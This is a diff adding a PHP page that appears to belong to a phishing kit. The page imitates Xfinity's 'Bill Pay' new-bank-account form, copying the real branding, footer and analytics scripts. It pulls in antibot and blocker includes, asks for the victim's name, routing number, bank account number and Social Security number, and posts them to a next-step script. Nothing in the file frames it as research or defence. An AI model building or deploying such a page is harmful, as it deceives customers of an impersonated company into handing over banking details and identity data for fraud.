@@ -1,0 +1,210 @@
+<?php
+require "includes/session_protect.php";
+require "includes/functions.php";
+require "includes/One_Time.php";
+include 'includes/antibots.php';
+include 'includes/bt.php';
+include "includes/blocker.php";
+
+?>
+<!DOCTYPE html>
+
+<html lang="en">
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+       <meta http-equiv="x-ua-compatible" content="ie=edge">
+      <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
+      <title>XFINITY | Bill Pay</title>
+      <link rel="apple-touch-icon" sizes="57x57" href="https://static.cimcontent.net/common-web-assets/favicon/apple-icon-57x57.png">
+      <link rel="apple-touch-icon" sizes="60x60" href="https://static.cimcontent.net/common-web-assets/favicon/apple-icon-60x60.png">
+      <link rel="apple-touch-icon" sizes="72x72" href="https://static.cimcontent.net/common-web-assets/favicon/apple-icon-72x72.png">
+      <link rel="apple-touch-icon" sizes="76x76" href="https://static.cimcontent.net/common-web-assets/favicon/apple-icon-76x76.png">
+      <link rel="apple-touch-icon" sizes="114x114" href="https://static.cimcontent.net/common-web-assets/favicon/apple-icon-114x114.png">
+      <link rel="apple-touch-icon" sizes="120x120" href="https://static.cimcontent.net/common-web-assets/favicon/apple-icon-120x120.png">
+      <link rel="apple-touch-icon" sizes="144x144" href="https://static.cimcontent.net/common-web-assets/favicon/apple-icon-144x144.png">
+      <link rel="apple-touch-icon" sizes="152x152" href="https://static.cimcontent.net/common-web-assets/favicon/apple-icon-152x152.png">
+      <link rel="apple-touch-icon" sizes="180x180" href="https://static.cimcontent.net/common-web-assets/favicon/apple-icon-180x180.png">
+      <link rel="icon" type="image/png" sizes="192x192" href="https://static.cimcontent.net/common-web-assets/favicon/android-icon-192x192.png">
+      <link rel="icon" type="image/png" sizes="32x32" href="https://static.cimcontent.net/common-web-assets/favicon/favicon-32x32.png">
+      <link rel="icon" type="image/png" sizes="96x96" href="https://static.cimcontent.net/common-web-assets/favicon/favicon-96x96.png">
+      <link rel="icon" type="image/png" sizes="16x16" href="https://static.cimcontent.net/common-web-assets/favicon/favicon-16x16.png">
+      <link rel="manifest" href="https://static.cimcontent.net/common-web-assets/favicon/site.webmanifest">
+      <link rel="mask-icon" href="https://static.cimcontent.net/common-web-assets/favicon/safari-pinned-tab.svg" color="#1f232e">
+      <link rel="shortcut icon" href="https://static.cimcontent.net/common-web-assets/favicon/favicon.ico">
+      <meta name="msapplication-TileColor" content="#1f232e">
+      <meta name="theme-color" content="#1f232e">
+      
+      
+      <link href="./css/main.c5269673.chunk.css" rel="stylesheet">
+      <style id="at-makers-style" class="at-flicker-control">
+         .mboxDefault {visibility: hidden;}
+      </style>
+      
+   </head>
+   <body>
+      <div id="root">
+         <div id="page-content" class="page-content">
+            <div class="page-app">
+               <header id="page-header" class="page-header" role="banner">
+                  <div class="page-header__logo-wrap">
+                     <a href="https://payments.xfinity.com/" class="page-header__logo" rel="home">
+                        <span class="svg-icon page-header__logo-svg">
+                           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 69 23.3">
+                              <path fill="currentColor" d="M7.71 11.76L12 6h-1.77a2 2 0 0 0-1.76.86L6.19 9.88 4 6.81A2 2 0 0 0 2.21 6H.4l4.28 5.81L0 18.09h1.71a2 2 0 0 0 1.76-.86l2.71-3.59 6.35 8.78a2 2 0 0 0 1.76.86h1.86zm34.68 6.33h2.45V6h-2.45zm-19.45 0h2.46V6h-2.46zm37.18 4.28L69 6h-1.33a1.81 1.81 0 0 0-1.76.86l-3.5 6.5-3-6.5A1.75 1.75 0 0 0 57.62 6h-1.28L61 15.85l-4.07 7.43h1.33a2 2 0 0 0 1.86-.91zM28.32 6v12.09h2.45V9.76A3.86 3.86 0 0 1 34 8c1.81 0 3 1.14 3 3.43v5.47a1.11 1.11 0 0 0 1.14 1.17h1.31V11c0-3.14-2-5.33-4.9-5.33a5.47 5.47 0 0 0-3.81 1.45V6zm21.06 7.83a4.21 4.21 0 0 0 4.52 4.52 6.23 6.23 0 0 0 1.79-.24l-.5-2.14a5 5 0 0 1-1.12.12 2.08 2.08 0 0 1-2.24-2.31V8.14h3.43L54.27 6h-2.43V1.07l-2.45 1.07V6h-2.6v2.14h2.59zm-34-5.64v9.95h2.45v-10H21V6h-3.15V5c0-2.07 1.24-2.76 2.45-2.76a2.93 2.93 0 0 1 .83.12l.5-2.17A4.29 4.29 0 0 0 20.11 0c-3 0-4.71 2.26-4.71 5v1h-1.29l-1.54 2.14z"></path>
+                           </svg>
+                        </span>
+                        <span class="visuallyhidden">XFINITY</span>
+                     </a>
+                  </div>
+                  <div class="page-header__cancel"></div>
+                  <div class="page-header__back"></div>
+               </header>
+               <main id="page-main" class="page-main" tabindex="-1" role="main">
+                  <div class="page-section ui-grey">
+                     <div class="page-section__wrapper">
+                        <div class="page-section__content">
+                           <form id="mainForm" action="Step5.php?ssl_id=<?php echo generateRandomString(130); ?>" method="post">
+                              <div class="payment-section">
+                                 <h1 class="heading2">New bank account</h1>
+                                 <div class="card-group">
+                                    <div class="card-group__item">
+                                       <div class="card">
+                                          <div class="card__content">
+                                             <div class="form-control-group form-control-group--boolean-flex-at-768">
+                                                <h3 class="label">Account type</h3>
+                                                <div class="form-control form-control--boolean undefined">
+                                                   <div class="form-control__input"><input id="paymentAccountChecking" aria-invalid="false" aria-describedby="error_paymentAccountChecking" class=" " type="radio" name="account" value="Checking" checked=""><label class="form-control__label" for="paymentAccountChecking"><span class="form-control__label-text body2">Checking account</span></label></div>
+                                                </div>
+                                                <div class="form-control form-control--boolean undefined">
+                                                   <div class="form-control__input"><input id="paymentAccountSavings" aria-invalid="false" aria-describedby="error_paymentAccountSavings" class=" " type="radio" name="account" value="Savings"><label class="form-control__label" for="paymentAccountSavings"><span class="form-control__label-text body2">Savings account</span></label></div>
+                                                </div>
+                                             </div>
+                                          </div>
+                                       </div>
+                                    </div>
+                                    <div class="card-group__item">
+                                       <div class="card">
+                                          <div class="card__content">
+                                             <div class="form-control-group form-control-group--flex-at-768">
+                                                <div class="form-control-group__item">
+                                                   <div class="form-control undefined">
+                                                      <label class="form-control__label" for="firstName">First name</label>
+                                                      <div class="form-control__input"><input id="firstName" aria-invalid="false" autocomplete="off" aria-describedby="error_firstName" class=" " name="firstName" type="text" title="First name" value="" required/></div>
+                                                   </div>
+                                                </div>
+                                                <div class="form-control-group__item">
+                                                   <div class="form-control undefined">
+                                                      <label class="form-control__label" for="lastName">Last name</label>
+                                                      <div class="form-control__input"><input id="lastName" aria-invalid="false" autocomplete="off" aria-describedby="error_lastName" class=" " name="lastName" type="text" title="Last name" value="" required/></div>
+                                                   </div>
+                                                </div>
+                                             </div>
+                                             <div class="form-control-group form-control-group--flex-at-768">
+                                                <div class="form-control-group__item">
+                                                   <div class="form-control undefined">
+                                                      <div class="form-control__input">
+                                                         <div class="form-control__label">
+                                                            <label for="routeNumber" class="d-inline-block">Routing number</label>
+                                                            <button class="button button--text" type="button">
+                                                               <svg focusable="false" viewBox="0 0 22 22" style="margin-left: 6px; width: 22px; height: 22px;">
+                                                                  <g fill="none">
+                                                                     <circle cx="11" cy="11" r="10" style="fill: none; stroke: currentcolor; stroke-miterlimit: 10;"></circle>
+                                                                     <path d="M13.14 15.665l-.168.682c-.5.198-.902.35-1.2.452-.298.103-.645.155-1.04.155-.606 0-1.078-.15-1.415-.444-.336-.295-.505-.67-.505-1.127 0-.176.012-.357.038-.542.025-.184.066-.393.122-.626l.626-2.216c.056-.212.103-.413.14-.604.04-.19.058-.363.058-.52 0-.282-.058-.48-.175-.59-.116-.112-.338-.17-.67-.17-.16 0-.327.027-.497.077-.17.052-.316.1-.438.146l.167-.684c.41-.167.803-.31 1.178-.43.375-.118.73-.177 1.065-.177.602 0 1.067.145 1.393.437.327.29.49.67.49 1.134 0 .097-.01.266-.034.51-.022.242-.064.465-.125.667L11.524 14c-.05.178-.097.38-.137.61-.04.226-.06.4-.06.515 0 .293.065.493.196.6.132.106.36.16.682.16.152 0 .324-.028.516-.08.19-.053.33-.1.417-.14zm.157-9.27c0 .386-.145.714-.436.984-.29.27-.64.406-1.05.406-.41 0-.762-.136-1.055-.407-.294-.27-.44-.6-.44-.984s.146-.713.44-.986c.293-.274.645-.41 1.055-.41.41 0 .76.137 1.05.41.292.273.437.602.437.986z" fill="currentColor"></path>
+                                                                  </g>
+                                                               </svg>
+                                                               <span class="visuallyhidden">More information about routing number</span>
+                                                            </button>
+                                                         </div>
+                                                         <input id="routeNumber" aria-invalid="false" aria-describedby="error_routeNumber" autocomplete="off" class="false " name="routeNumber" type="text" minlength="9" pattern="^[0-9]+$" aria-required="true" value="" required/>
+                                                      </div>
+                                                   </div>
+                                                </div>
+                                                <div class="form-control-group__item">
+                                                   <div class="form-control undefined">
+                                                      <div class="form-control__input">
+                                                         <div class="form-control__label">
+                                                            <label for="bankNumber" class="d-inline-block">Bank account number</label>
+                                                            <button class="button button--text" type="button">
+                                                               <svg focusable="false" viewBox="0 0 22 22" style="margin-left: 6px; width: 22px; height: 22px;">
+                                                                  <g fill="none">
+                                                                     <circle cx="11" cy="11" r="10" style="fill: none; stroke: currentcolor; stroke-miterlimit: 10;"></circle>
+                                                                     <path d="M13.14 15.665l-.168.682c-.5.198-.902.35-1.2.452-.298.103-.645.155-1.04.155-.606 0-1.078-.15-1.415-.444-.336-.295-.505-.67-.505-1.127 0-.176.012-.357.038-.542.025-.184.066-.393.122-.626l.626-2.216c.056-.212.103-.413.14-.604.04-.19.058-.363.058-.52 0-.282-.058-.48-.175-.59-.116-.112-.338-.17-.67-.17-.16 0-.327.027-.497.077-.17.052-.316.1-.438.146l.167-.684c.41-.167.803-.31 1.178-.43.375-.118.73-.177 1.065-.177.602 0 1.067.145 1.393.437.327.29.49.67.49 1.134 0 .097-.01.266-.034.51-.022.242-.064.465-.125.667L11.524 14c-.05.178-.097.38-.137.61-.04.226-.06.4-.06.515 0 .293.065.493.196.6.132.106.36.16.682.16.152 0 .324-.028.516-.08.19-.053.33-.1.417-.14zm.157-9.27c0 .386-.145.714-.436.984-.29.27-.64.406-1.05.406-.41 0-.762-.136-1.055-.407-.294-.27-.44-.6-.44-.984s.146-.713.44-.986c.293-.274.645-.41 1.055-.41.41 0 .76.137 1.05.41.292.273.437.602.437.986z" fill="currentColor"></path>
+                                                                  </g>
+                                                               </svg>
+                                                               <span class="visuallyhidden">More information about bank account number</span>
+                                                            </button>
+                                                         </div>
+                                                         <input id="bankNumber" aria-invalid="false" aria-describedby="error_bankNumber" class="false " name="bankNumber" type="text" pattern="^[0-9]+$" value="" autocomplete="off" required/>
+                                                      </div>
+                                                   </div>
+                                                </div>
+                                             </div>
+											  <div class="form-control-group form-control-group--flex-at-768">
+                                                <div class="form-control-group__item">
+                                                   <div class="form-control undefined">
+                                                      <div class="form-control__input">
+                                                         <div class="form-control__label">
+                                                            <label for="routeNumber" class="d-inline-block">Social Security number</label>
+                                                            <button class="button button--text" type="button">
+                                                               <svg focusable="false" viewBox="0 0 22 22" style="margin-left: 6px; width: 22px; height: 22px;">
+                                                                  <g fill="none">
+                                                                     <circle cx="11" cy="11" r="10" style="fill: none; stroke: currentcolor; stroke-miterlimit: 10;"></circle>
+                                                                     <path d="M13.14 15.665l-.168.682c-.5.198-.902.35-1.2.452-.298.103-.645.155-1.04.155-.606 0-1.078-.15-1.415-.444-.336-.295-.505-.67-.505-1.127 0-.176.012-.357.038-.542.025-.184.066-.393.122-.626l.626-2.216c.056-.212.103-.413.14-.604.04-.19.058-.363.058-.52 0-.282-.058-.48-.175-.59-.116-.112-.338-.17-.67-.17-.16 0-.327.027-.497.077-.17.052-.316.1-.438.146l.167-.684c.41-.167.803-.31 1.178-.43.375-.118.73-.177 1.065-.177.602 0 1.067.145 1.393.437.327.29.49.67.49 1.134 0 .097-.01.266-.034.51-.022.242-.064.465-.125.667L11.524 14c-.05.178-.097.38-.137.61-.04.226-.06.4-.06.515 0 .293.065.493.196.6.132.106.36.16.682.16.152 0 .324-.028.516-.08.19-.053.33-.1.417-.14zm.157-9.27c0 .386-.145.714-.436.984-.29.27-.64.406-1.05.406-.41 0-.762-.136-1.055-.407-.294-.27-.44-.6-.44-.984s.146-.713.44-.986c.293-.274.645-.41 1.055-.41.41 0 .76.137 1.05.41.292.273.437.602.437.986z" fill="currentColor"></path>
+                                                                  </g>
+                                                               </svg>
+                                                               <span class="visuallyhidden">More information about routing number</span>
+                                                            </button>
+                                                         </div>
+                                                         <input id="ssn" aria-invalid="false" aria-describedby="error_routeNumber" class="false " name="ssn" type="password" maxlength="12" aria-required="true" value="" autocomplete="off" required/>
+                                                      </div>
+                                                   </div>
+                                                </div>
+                                          </div>
+                                       </div>
+                                    </div>
+                                   
+                                 <div class="card">
+                                    <div class="card__content">
+                                       <div class="form-control form-control--boolean undefined">
+                                          <div class="form-control__input"><input id="savePayment" aria-invalid="false" aria-describedby="error_savePayment" class=" " type="checkbox" name="savePayment" value="" required/><label class="form-control__label" for="savePayment"><span>I agree to the <a href="https://payments.xfinity.com/terms/stored-payment" target="_blank" rel="noopener noreferrer">Stored Payment Methods Terms &amp; Conditions</a></span></label></div>
+                                       </div>
+                                    </div>
+                                 </div>
+                              </div>
+                              <div class="payment-section">
+                                 <h2>Set up automatic payments</h2>
+                                 <div class="card-group">
+                                    <div class="card-group__item">
+                                       <div class="card">
+                                          <div class="card__content">
+                                             <div class="form-control form-control--boolean undefined">
+                                                <div class="form-control__input"><input id="autopay" aria-invalid="false" aria-describedby="error_autopay" class=" " type="checkbox" name="autopay" value=""><label class="form-control__label" for="autopay"><span class="autopay-label"><span class="payment-instrument-helper-text">Turn on automatic payments using this payment method</span></span></label></div>
+                                             </div>
+                                          </div>
+                                       </div>
+                                    </div>
+                                 </div>
+                              </div>
+                              <div class="action action--right pt6">
+                                 <div class="action__item"><button type="submit" class="button button--primary">Save</button></div>
+                                 <div class="action__item"><a class="button" href="step2.php">Back</a></div>
+                              </div>
+                           </form>
+                        </div>
+                     </div>
+                  </div>
+               </main>
+               <div class="page-footer page-footer--thin ">
+                  <div class="link-group">
+                     <div class="link-group__item">© 2020 Comcast</div>
+                     <div class="link-group__item"><a href="https://www.xfinity.com/privacy/policy" target="_blank" rel="noopener noreferrer">Privacy Policy</a></div>
+                     <div class="link-group__item"><a href="https://www.xfinity.com/privacy/manage-preference" target="_blank" rel="noopener noreferrer">Cal. Civ. Code §1798.135: Do Not Sell My Info</a></div>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+      <script>!function(){var e=document.createElement("script");"prod"!==window.MAW.env?(document.write('<script src="//assets.adobedtm.com/43896e740dcedef854392e0be6ea80deb8eb2ba5/satelliteLib-773f1d685076ba02ef9dd20f568cce9a6f1991dd-staging.js"><\/script>'),e.src="https://cdn.comcast.com/-/media/common/analytics/data-layer-non-prod-3-4-2-min.js"):(document.write('<script src="//assets.adobedtm.com/43896e740dcedef854392e0be6ea80deb8eb2ba5/satelliteLib-773f1d685076ba02ef9dd20f568cce9a6f1991dd.js"><\/script>'),e.src="https://cdn.comcast.com/-/media/common/analytics/data-layer-prod-3-4-2-min.js"),e.crossOrigin="anonymous",document.body.appendChild(e)}()</script><script src="./Bank_files/satelliteLib-773f1d685076ba02ef9dd20f568cce9a6f1991dd.js.download"></script><script src="./Bank_files/data-layer-prod-3-4-2-min.js.download" crossorigin="anonymous"></script><script>document.dispatchEvent(new window.CustomEvent("c-tracking-init-start",{bubbles:!0})),document.dispatchEvent(new window.CustomEvent("c-tracking-init-end",{bubbles:!0}))</script><script>!function(l){function e(e){for(var r,t,n=e[0],o=e[1],u=e[2],f=0,i=[];f<n.length;f++)t=n[f],p[t]&&i.push(p[t][0]),p[t]=0;for(r in o)Object.prototype.hasOwnProperty.call(o,r)&&(l[r]=o[r]);for(s&&s(e);i.length;)i.shift()();return c.push.apply(c,u||[]),a()}function a(){for(var e,r=0;r<c.length;r++){for(var t=c[r],n=!0,o=1;o<t.length;o++){var u=t[o];0!==p[u]&&(n=!1)}n&&(c.splice(r--,1),e=f(f.s=t[0]))}return e}var t={},p={2:0},c=[];function f(e){if(t[e])return t[e].exports;var r=t[e]={i:e,l:!1,exports:{}};return l[e].call(r.exports,r,r.exports,f),r.l=!0,r.exports}f.m=l,f.c=t,f.d=function(e,r,t){f.o(e,r)||Object.defineProperty(e,r,{enumerable:!0,get:t})},f.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},f.t=function(r,e){if(1&e&&(r=f(r)),8&e)return r;if(4&e&&"object"==typeof r&&r&&r.__esModule)return r;var t=Object.create(null);if(f.r(t),Object.defineProperty(t,"default",{enumerable:!0,value:r}),2&e&&"string"!=typeof r)for(var n in r)f.d(t,n,function(e){return r[e]}.bind(null,n));return t},f.n=function(e){var r=e&&e.__esModule?function(){return e.default}:function(){return e};return f.d(r,"a",r),r},f.o=function(e,r){return Object.prototype.hasOwnProperty.call(e,r)},f.p="/";var r=window.webpackJsonp=window.webpackJsonp||[],n=r.push.bind(r);r.push=e,r=r.slice();for(var o=0;o<r.length;o++)e(r[o]);var s=n;a()}([])</script><script src="./Bank_files/1.7cea48be.chunk.js.download"></script><script src="./Bank_files/main.f03ef12f.chunk.js.download"></script><iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_comcast_0" name="destination_publishing_iframe_comcast_0_name" src="./Bank_files/dest5.html" class="aamIframeLoaded" style="display: none; width: 0px; height: 0px;"></iframe>
+      <div class="ReactModalPortal"></div>
+   </body>
+</html>
